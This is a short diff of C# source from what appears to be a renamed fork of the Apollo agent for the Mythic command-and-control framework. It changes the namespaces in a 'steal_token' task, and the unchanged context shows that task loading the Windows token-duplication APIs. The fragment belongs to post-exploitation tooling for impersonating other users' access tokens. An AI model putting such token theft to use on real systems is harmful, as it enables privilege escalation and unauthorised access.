@@ -6,10 +6,10 @@
 
 #if STEAL_TOKEN
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Classes;
+using NotpolloInterop.Classes.Api;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -39,7 +39,7 @@ namespace Tasks
         private DuplicateTokenEx _pDuplicateTokenEx;
         private CloseHandle _pCloseHandle;
 
-        public steal_token(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public steal_token(IAgent agent, NotpolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
             _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
             _pDuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
